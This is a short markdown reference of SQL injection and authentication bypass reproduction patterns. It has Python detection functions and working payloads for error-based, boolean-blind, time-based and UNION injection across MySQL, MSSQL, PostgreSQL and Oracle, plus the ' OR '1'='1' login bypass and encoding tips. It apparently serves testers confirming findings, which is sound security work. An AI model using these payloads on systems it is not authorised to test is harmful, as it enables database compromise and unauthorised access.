# Web Injection Reproduction Patterns (SQLi / Auth Bypass)

## Error-Based SQLi

Signature: database error string appears **only** in the attack response, not the baseline.

```python
def check(url, path, params, inject_key):
    base = params.copy()
    s = requests.Session()

    benign = base.copy()                      # baseline: same shape, benign value
    benign[inject_key] = "1"
    r0 = s.get(url + path, params=benign, timeout=10)

    attack = base.copy()
    attack[inject_key] = "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -"
    r1 = s.get(url + path, params=attack, timeout=10)

    return bool(re.search(r"XPATH|~[0-9.]+~", r1.text, re.I)) and "XPATH" not in r0.text
```

- MySQL fingerprints: `XPATH syntax error`, `You have an error in your SQL syntax`, `mysql_fetch`
- MSSQL: `Unclosed quotation mark`, `Incorrect syntax near`
- PostgreSQL: `ERROR:  syntax error at or near`, `LINE 1:`

## Boolean Blind SQLi

Compare row counts via `AND 1=1` / `AND 1=2` on the same query:

```python
def blind_bool(s, url, path, params, inject_key):
    def probe(cond):
        p = params.copy()
        p[inject_key] = f"1' {cond}-- -"
        r = s.get(url + path, params=p, timeout=10)
        return len(r.text)                     # or "admin" in r.text / 200 vs 302

    return abs(probe("AND 1=1") - probe("AND 1=2")) > 50   # significant page diff
```

## Time-Based Blind SQLi

Payload: `1' AND SLEEP(5)-- -`. Measure baseline vs attack with 5 samples each:

```python
def timed(probe, baseline_ms, samples=5):
    times = [probe() for _ in range(samples)]
    return sum(times) / samples > max(baseline_ms * 2, baseline_ms + 2500)
```

- MySQL: `SLEEP(n)` / `BENCHMARK(n,MD5(1))`
- MSSQL: `WAITFOR DELAY '0:0:5'`
- PostgreSQL: `pg_sleep(5)`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE('a',5)`

## UNION-Based

Probe column count with `ORDER BY n-- -` (increment n until error), then:

```python
p[inject_key] = "0' UNION SELECT 1,2,3,@@version-- -"
```

Signature: the injected constant (e.g. `2`) appears in the response body.

## Auth Bypass

- `' OR '1'='1' -- -` in the username field: signature is a **different** redirect/status vs baseline (`302 → /dashboard` instead of `302 → /login?error`)
- SQLi in auth bypass: check the `Set-Cookie` header for a valid session after the attack request
- Never treat "200 with login page" as success — bypass means you **leave** the login page

## Encoding Gotchas

- URL-encode the whole payload once via `requests` params (it encodes for you — do NOT pre-encode `'`, `=`, spaces)
- Body payloads: `data=json.dumps(...)` for JSON endpoints, `data=urlencode(...)` for forms
- `#` comment (`-- -` has a trailing space) — in JSON bodies use `-- -` without newline; in URL params keep the space (requests encodes it to `%20`)
